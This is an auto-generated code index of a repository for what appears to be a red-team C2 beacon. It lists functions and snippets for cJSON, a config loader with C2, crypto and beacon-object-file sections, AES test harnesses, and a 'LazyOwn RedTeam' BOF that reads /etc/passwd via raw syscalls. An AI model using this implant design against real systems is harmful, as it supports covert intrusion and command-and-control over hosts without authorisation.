- `MemoryStruct` (line 220) - *if (g_cache_count >= g_cache_capacity) { size_t new_cap = g_cache_capacity ? g_cache_capacity * 2 : 8; TrampolineCache *tmp = realloc(g_trampoline_cache, new_cap * sizeof(TrampolineCache)); if (!tmp) return tramp; g_trampoline_cache = tmp; g_cache_capacity = new_cap; } g_trampoline_cache[g_cache_count].original = target; g_trampoline_cache[g_cache_count].trampoline = tramp; g_cache_count++; return tramp; } /* --- HTTP client ---*

#### `cJSON.c`
**Path:** `include/cJSON.c`

**Functions:**
- `CJSON_PUBLIC` (line 94) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- `CJSON_PUBLIC` (line 99) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 109) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 124) `CJSON_PUBLIC(const char*) cJSON_Version(void)` - *CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item) { if (!cJSON_IsNumber(item)) { return (double) NAN; } return item->valuedouble; } /* This is a safeguard to prevent copy-pasters from using incompatible C and header files if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) error cJSON.h and cJSON.c have different versions. Make sure that both have the same. endif*
- `case_insensitive_strcmp` (line 134) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)` - */* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1) || (CJSON_VERSION_MINOR != 7) || (CJSON_VERSION_PATCH != 18) #error cJSON.h and cJSON.c have different versions. Make sure that both have the same. #endif CJSON_PUBLIC(const char*) cJSON_Version(void) { static char version[15]; sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH); return version; } /* Case insensitive string comparison, doesn't consider two NULL pointers equal though*
- `internal_malloc` (line 166) `static void * CJSON_CDECL internal_malloc(size_t size)` - *} return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t size); void (CJSON_CDECL *deallocate)(void *pointer); void *(CJSON_CDECL *reallocate)(void *pointer, size_t size); } internal_hooks; #if defined(_MSC_VER) /* work around MSVC error C2322: '...' address of dllimport '...' is not static*
- `internal_free` (line 170) `static void CJSON_CDECL internal_free(void *pointer)`
- `internal_realloc` (line 174) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- `cJSON_strdup` (line 188) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- `CJSON_PUBLIC` (line 209) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- `cJSON_New_Item` (line 242) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)` - *if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc are used global_hooks.reallocate = NULL; if ((global_hooks.allocate == malloc) && (global_hooks.deallocate == free)) { global_hooks.reallocate = realloc; } } /* Internal constructor.*
- `get_decimal_point` (line 281) `static unsigned char get_decimal_point(void)` - *item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate(item->string); item->string = NULL; } global_hooks.deallocate(item); item = next; } } /* get the decimal point character of the current locale*
- `parse_number` (line 309) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)` - *size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks hooks; } parse_buffer; /* check if the given size is left to read in a given parse buffer (starting with 1) #define can_read(buffer, size) ((buffer != NULL) && (((buffer)->offset + size) <= (buffer)->length)) /* check if the buffer can be accessed at the given index (starting with 0) #define can_access_at_index(buffer, index) ((buffer != NULL) && (((buffer)->offset + index) < (buffer)->length)) #define cannot_access_at_index(buffer, index) (!can_access_at_index(buffer, index)) /* get a pointer to the buffer at the position #define buffer_at_offset(buffer) ((buffer)->content + (buffer)->offset) /* Parse the input text to generate a number, and populate the result into item.*
- `ensure` (line 494) `static unsigned char* ensure(printbuffer * const p, size_t needed)` - *} typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for formatted printing) cJSON_bool noalloc; cJSON_bool format; /* is this print a formatted print internal_hooks hooks; } printbuffer; /* realloc printbuffer if necessary to have at least "needed" bytes more*
- `update_offset` (line 579) `static void update_offset(printbuffer * const buffer)` - *p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->length = newsize; p->buffer = newbuffer; return newbuffer + p->offset; } /* calculate the new length of the string in a printbuffer and update the offset*
- `compare_double` (line 592) `static cJSON_bool compare_double(double a, double b)` - */* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer * const buffer) { const unsigned char *buffer_pointer = NULL; if ((buffer == NULL) || (buffer->buffer == NULL)) { return; } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables*
- `print_number` (line 599) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)` - *} buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely comparison of floating-point variables static cJSON_bool compare_double(double a, double b) { double maxVal = fabs(a) > fabs(b) ? fabs(a) : fabs(b); return (fabs(a - b) <= maxVal * DBL_EPSILON); } /* Render the number nicely from the given item into a string.*
- `parse_hex4` (line 669) `static unsigned parse_hex4(const unsigned char * const input)` - *output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->offset += (size_t)length; return true; } /* parse 4 digit hexadecimal number*
- `utf16_literal_to_utf8` (line 706) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...` - *converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX*
- `parse_string` (line 827) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)` - *else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length; fail: return 0; } /* Parse the input text into an unescaped cinput, and populate item.*
- `print_string_ptr` (line 957) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...` - *{ input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(input_pointer - input_buffer->content); } return false; } /* Render the cstring provided to an escaped version that can be printed.*
- `print_string` (line 1079) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)` - */* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; break; } } } output[output_length + 1] = '"'; output[output_length + 2] = '\0'; return true; } /* Invoke print_string_ptr (which is useful) on an item.*
- `buffer_skip_whitespace` (line 1093) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)` - *static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char*)item->valuestring, p); } /* Predeclare these prototypes. static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer); static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer); static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer); /* Utility to jump whitespace and cr/lf*
- `skip_utf8_bom` (line 1119) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)` - *while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset == buffer->length) { buffer->offset--; } return buffer; } /* skip the UTF-8 BOM (byte order mark) if it is at the beginning of a buffer*
- `CJSON_PUBLIC` (line 1133) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- `CJSON_PUBLIC` (line 1235) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- `print` (line 1242) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...` - *define cjson_min(a, b) (((a) < (b)) ? (a) : (b))*
- `CJSON_PUBLIC` (line 1315) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- `CJSON_PUBLIC` (line 1320) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- `CJSON_PUBLIC` (line 1351) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- `parse_value` (line 1372) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)` - *return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format = format; p.hooks = global_hooks; return print_value(item, &p); } /* Parser core - when encountering text, process appropriately.*
- `print_value` (line 1427) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)` - *if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input_buffer); } /* object if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '{')) { return parse_object(item, input_buffer); } return false; } /* Render a value to text.*
- `parse_array` (line 1501) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)` - *return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: return print_object(item, output_buffer); default: return false; } } /* Build an array from input text.*
- `print_array` (line 1599) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)` - *input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array to text*
- `parse_object` (line 1661) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)` - *output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_pointer = '\0'; output_buffer->depth--; return true; } /* Build an object from the text.*
- `print_object` (line 1780) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)` - *input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object to text.*
- `get_array_item` (line 1915) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- `CJSON_PUBLIC` (line 1934) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- `get_object_item` (line 1944) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- `CJSON_PUBLIC` (line 1976) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- `CJSON_PUBLIC` (line 1981) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- `CJSON_PUBLIC` (line 1986) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- `suffix_object` (line 1993) `static void suffix_object(cJSON *prev, cJSON *item)` - *return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * const string) { return get_object_item(object, string, true); } CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling.*
- `create_reference` (line 2000) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)` - *CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(object, string) ? 1 : 0; } /* Utility for array list handling. static void suffix_object(cJSON *prev, cJSON *item) { prev->next = item; item->prev = prev; } /* Utility for handling references.*
- `add_item_to_array` (line 2020) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- `cast_away_const` (line 2066) `static void* cast_away_const(const void* string)` - */* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_to_array(array, item); } #if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) #pragma GCC diagnostic push #endif #ifdef __GNUC__ #pragma GCC diagnostic ignored "-Wcast-qual" #endif /* helper function to cast away const*
- `add_item_to_object` (line 2073) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...` - *if defined(__clang__) || (defined(__GNUC__) && ((__GNUC__ > 4) || ((__GNUC__ == 4) && (__GNUC__-MINOR__ > 5)))) pragma GCC diagnostic pop endif*
- `CJSON_PUBLIC` (line 2111) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- `CJSON_PUBLIC` (line 2122) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- `CJSON_PUBLIC` (line 2132) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- `CJSON_PUBLIC` (line 2142) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2154) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2166) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2178) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- `CJSON_PUBLIC` (line 2190) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- `CJSON_PUBLIC` (line 2202) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- `CJSON_PUBLIC` (line 2214) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- `CJSON_PUBLIC` (line 2226) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2238) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- `CJSON_PUBLIC` (line 2250) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- `CJSON_PUBLIC` (line 2286) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- `CJSON_PUBLIC` (line 2296) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- `CJSON_PUBLIC` (line 2301) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2308) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2315) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2320) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- `CJSON_PUBLIC` (line 2362) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- `CJSON_PUBLIC` (line 2412) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- `replace_item_in_object` (line 2422) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- `CJSON_PUBLIC` (line 2445) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- `CJSON_PUBLIC` (line 2450) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- `CJSON_PUBLIC` (line 2467) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- `CJSON_PUBLIC` (line 2478) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- `CJSON_PUBLIC` (line 2489) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- `CJSON_PUBLIC` (line 2500) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- `CJSON_PUBLIC` (line 2525) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- `CJSON_PUBLIC` (line 2542) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- `CJSON_PUBLIC` (line 2554) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- `CJSON_PUBLIC` (line 2566) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- `CJSON_PUBLIC` (line 2578) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- `CJSON_PUBLIC` (line 2595) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- `CJSON_PUBLIC` (line 2606) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- `CJSON_PUBLIC` (line 2658) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- `CJSON_PUBLIC` (line 2698) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- `CJSON_PUBLIC` (line 2738) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- `cJSON_Duplicate_rec` (line 2785) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- `skip_oneline_comment` (line 2872) `static void skip_oneline_comment(char **input)`
- `skip_multiline_comment` (line 2885) `static void skip_multiline_comment(char **input)`
- `minify_string` (line 2899) `static void minify_string(char **input, char **output)`
- `CJSON_PUBLIC` (line 2921) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- `CJSON_PUBLIC` (line 2971) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- `CJSON_PUBLIC` (line 2981) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- `CJSON_PUBLIC` (line 2991) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3001) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3011) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3021) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3031) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3041) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3051) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3061) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- `CJSON_PUBLIC` (line 3071) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- `cJSON_ArrayForEach` (line 3157) `cJSON_ArrayForEach(a_element, a)`
- `cJSON_ArrayForEach` (line 3173) `cJSON_ArrayForEach(b_element, b)` - *doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is just a fix for now*
- `CJSON_PUBLIC` (line 3193) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- `CJSON_PUBLIC` (line 3198) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- `sprintf` (line 128) `sprintf(version, "%i.%i.%i", CJSON_VERSION_MAJOR, CJSON_VERSION_MINOR, CJSON_VERSION_PATCH);`
- `tolower` (line 153) `return tolower(*string1) - tolower(*string2);`
- `void` (line 160) `void (CJSON_CDECL *deallocate)(void *pointer);`
- `malloc` (line 168) `return malloc(size);`
- `free` (line 172) `free(pointer);`
- `realloc` (line 176) `return realloc(pointer, size);`
- `memcpy` (line 205) `memcpy(copy, string, length);`
- `memset` (line 247) `memset(node, '\0', sizeof(cJSON));`
- `cJSON_Delete` (line 262) `cJSON_Delete(item->child);`
- `strcpy` (line 464) `strcpy(object->valuestring, valuestring);`
- `cJSON_free` (line 475) `cJSON_free(object->valuestring);`
- `cJSON_ParseWithLengthOpts` (line 1145) `return cJSON_ParseWithLengthOpts(value, buffer_length, return_parse_end, require_null_terminated);`
- `cJSON_ParseWithOpts` (line 1233) `return cJSON_ParseWithOpts(value, 0, 0);`
- `cJSON_DetachItemViaPointer` (line 2293) `return cJSON_DetachItemViaPointer(array, get_array_item(array, (size_t)which));`
- `cJSON_ReplaceItemViaPointer` (line 2419) `return cJSON_ReplaceItemViaPointer(array, get_array_item(array, (size_t)which), newitem);`

**Macros:**
- `_CRT_SECURE_NO_DEPRECATE` (line 28) `#define _CRT_SECURE_NO_DEPRECATE`
- `true` (line 65) `#define true`
- `false` (line 70) `#define false`
- `isinf` (line 74) `#define isinf(d)`
- `isnan` (line 77) `#define isnan(d)`
- `NAN` (line 82) `#define NAN`
- `NAN` (line 84) `#define NAN`
- `internal_malloc` (line 179) `#define internal_malloc`
- `internal_free` (line 180) `#define internal_free`
- `internal_realloc` (line 181) `#define internal_realloc`
- `static_strlen` (line 185) `#define static_strlen(string_literal)`
- `can_read` (line 301) `#define can_read(buffer, size)`
- `can_access_at_index` (line 303) `#define can_access_at_index(buffer, index)`
- `cannot_access_at_index` (line 304) `#define cannot_access_at_index(buffer, index)`
- `buffer_at_offset` (line 306) `#define buffer_at_offset(buffer)`
- `cjson_min` (line 1240) `#define cjson_min(a, b)`

**Structs:**
- `internal_hooks` (line 157)
- `error` (line 88)
- `parse_buffer` (line 291)
- `printbuffer` (line 482)

#### `config.c`
**Path:** `include/config.c`

**Functions:**
- `slurp` (line 24) `static char *slurp(const char *path, size_t *out_len)` - *declared in the schema. Unknown keys are skipped. Missing sections fall back to safe defaults.  #define _POSIX_C_SOURCE 200809L #include "config.h" #include <stdio.h> #include <stdlib.h> #include <string.h> #include <ctype.h> #include <time.h> #include <unistd.h> #include <limits.h> /* --- file slurper ---*
- `skip_ws` (line 41) `static const char *skip_ws(const char *p, const char *end)` - *fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET); if (n < 0) { fclose(f); return NULL; } char *buf = (char *)malloc((size_t)n + 1); if (!buf) { fclose(f); return NULL; } if (fread(buf, 1, (size_t)n, f) != (size_t)n) { fclose(f); free(buf); return NULL; } buf[n] = '\0'; fclose(f); out_len = (size_t)n; return buf; } /* --- lexer-style cursor helpers ---*
- `read_string` (line 49) `static int read_string(const char **pp, const char *end, char *out, size_t outsz)` - *Read a JSON string starting at *pp (which must point at "). On success, write the unescaped string into out (NUL terminated) * and advance *pp past the closing quote.*
- `read_int` (line 75) `static int read_int(const char **pp, const char *end, int *out)`
- `read_bool` (line 91) `static int read_bool(const char **pp, const char *end, int *out)`
- `expect` (line 100) `static int expect(const char **pp, const char *end, char c)` - *} out = (int)(neg ? -v : v); pp = p; return 1; } static int read_bool(const char **pp, const char *end, int *out) { const char *p = skip_ws(*pp, end); if ((end - p) >= 4 && !memcmp(p, "true", 4)) { *out = 1; *pp = p + 4; return 1; } if ((end - p) >= 5 && !memcmp(p, "false", 5)) { *out = 0; *pp = p + 5; return 1; } return 0; } /* Expect the literal byte c.*
- `find_matching_brace` (line 109) `static const char *find_matching_brace(const char *p, const char *end)` - *Find the byte position of the matching closing brace for the * opening { at *pp. Honors string and escape rules.*
- `skip_value` (line 132) `static const char *skip_value(const char *p, const char *end)` - *Skip the next value at p (string, number, bool, null, object, array). * Returns the position just past the value, or NULL on error.*
- `hex_to_bytes` (line 174) `static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen)` - *else if (ch == ']') { depth--; if (depth == 0) return p + 1; } p++; } return NULL; } if (c == 't') return p + 4; if (c == 'f') return p + 5; if (c == 'n') return p + 4; /* number while (p < end && (*p == '-' || isdigit((unsigned char)*p) || *p == '.' || *p == 'e' || *p == 'E' || *p == '+')) p++; return p; } /* --- hex decode ---*
- `parse_c2` (line 186) `static void parse_c2(const char *p, const char *end, bsb_config_t *cfg)` - */* --- hex decode --- static int hex_to_bytes(const char *hex, uint8_t *out, size_t outlen) { size_t hlen = strlen(hex); if (hlen != outlen * 2) return -1; for (size_t i = 0; i < outlen; i++) { unsigned int byte; if (sscanf(hex + i * 2, "%2x", &byte) != 1) return -1; out[i] = (uint8_t)byte; } return 0; } /* --- per-section parsers ---*
- `parse_crypto` (line 208) `static void parse_crypto(const char *p, const char *end, bsb_config_t *cfg)`
- `parse_timing` (line 229) `static void parse_timing(const char *p, const char *end, bsb_config_t *cfg)`
- `parse_network` (line 252) `static void parse_network(const char *p, const char *end, bsb_config_t *cfg)`
- `parse_bof` (line 288) `static void parse_bof(const char *p, const char *end, bsb_config_t *cfg)`
- `parse_backoff` (line 307) `static void parse_backoff(const char *p, const char *end, bsb_config_t *cfg)`
- `bsb_config_load` (line 328) `int bsb_config_load(const char *path, bsb_config_t *cfg, char *err, size_t errlen)` - *if (!expect(&p, end, ':')) return; if (!strcmp(key, "base_seconds")) { if (!read_int(&p, end, &cfg->backoff.base_seconds)) return; } else if (!strcmp(key, "max_seconds")) { if (!read_int(&p, end, &cfg->backoff.max_seconds)) return; } else { p = skip_value(p, end); if (!p) return; } p = skip_ws(p, end); if (p < end && *p == ',') p++; } } /* --- main load ---*
- `binary_dir` (line 420) `static const char *binary_dir(char *out, size_t outsz)` - *Return the directory the running binary lives in, or NULL if we cannot resolve it (e.g. on platforms without /proc/self/exe). The returned buffer is statically sized; the caller copies if * it needs to keep the value past subsequent calls.*
- `bsb_config_load_default` (line 437) `int bsb_config_load_default(bsb_config_t *cfg, char *err, size_t errlen)`
- `bsb_config_sleep_seconds` (line 465) `int bsb_config_sleep_seconds(const bsb_config_t *cfg)`
- `fseek` (line 27) `fseek(f, 0, SEEK_END);`
- `fclose` (line 35) `fclose(f);`
- `memset` (line 330) `memset(cfg, 0, sizeof(*cfg));`
- `snprintf` (line 331) `snprintf(cfg->path, sizeof(cfg->path), "%s", path);`
- `free` (line 365) `free(buf);`

**Macros:**
- `_POSIX_C_SOURCE` (line 13) `#define _POSIX_C_SOURCE`

#### `issudo.c`
**Path:** `issudo.c`
**File Doc:** *is_sudo.c — LazyOwn RedTeam BOF (Linux/x64) define NULL ((void*)0) define CALLBACK_OUTPUT 0  Tipos*

**Functions:**
- `syscall3` (line 22) `static inline long syscall3(long n, long a1, long a2, long a3)` - *Wrappers*
- `syscall1` (line 31) `static inline long syscall1(long n, long a1)`
- `strcmp` (line 43) `static int strcmp(const char *s1, const char *s2)` - *strcmp mínimo (necesario para comparar strings)*
- `get_username_from_uid` (line 52) `static int get_username_from_uid(long uid, char *buf, int buf_size)` - *Obtener username desde /etc/passwd (sin libc)*
- `go` (line 107) `void go(char *args, int alen)`
- `BeaconPrintf` (line 10) `extern void BeaconPrintf(int, const char*, ...);` - *Símbolos del beacon*
- `BeaconOutput` (line 11) `extern void BeaconOutput(int, const char*, int);`
- `volatile` (line 24) `__asm__ volatile ("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory" );`

**Macros:**
- `NULL` (line 2) `#define NULL`
- `CALLBACK_OUTPUT` (line 3) `#define CALLBACK_OUTPUT`
- `SYS_openat` (line 14) `#define SYS_openat`
- `SYS_read` (line 15) `#define SYS_read`
- `SYS_close` (line 16) `#define SYS_close`
- `SYS_getuid` (line 17) `#define SYS_getuid`
- `SYS_getpwuid_r` (line 18) `#define SYS_getpwuid_r`
- `AT_FDCWD` (line 19) `#define AT_FDCWD`

**Type_Aliases:**
- `size_t` (line 6) `typedef unsigned long size_t;` - *Tipos*
- `ssize_t` (line 7) `typedef long ssize_t;`

#### `config_harness.c`
**Path:** `tests/config_harness.c`

**Functions:**
- `main` (line 21) `int main(void)`
- `fprintf` (line 26) `fprintf(stderr, "config error: %s\n", err);`
- `hex_encode` (line 31) `hex_encode(cfg.crypto.key, BSB_AES_KEY_BYTES, key_hex);`
- `printf` (line 32) `printf("c2.url=%s\n", cfg.c2.url);`

#### `crypto_harness.c`
**Path:** `tests/crypto_harness.c`

**Functions:**
- `hex_to_bytes` (line 11) `static int hex_to_bytes(const char *hex, unsigned char *out, size_t outlen)` - *crypto_harness.c - Roundtrip test harness for AES-256-CFB.  Used by tests/test_crypto.py to validate the AES path the beacon and C2 server use for command/result encryption.  include "aes_cfb.h" include <stdio.h> include <stdlib.h> include <string.h>*
- `main` (line 22) `int main(int argc, char **argv)`
- `fprintf` (line 31) `fprintf(stderr, "usage: %s --key <64hex> --plain <text>\n", argv[0]);`
- `printf` (line 37) `printf("FAIL:bad-key\n");`
- `free` (line 50) `free(cipher);`
- `snprintf` (line 68) `snprintf(hex + i*2, 3, "%02x", cipher[i]);`

### H (11 files)

#### `aes.h`
**Path:** `aes.h`
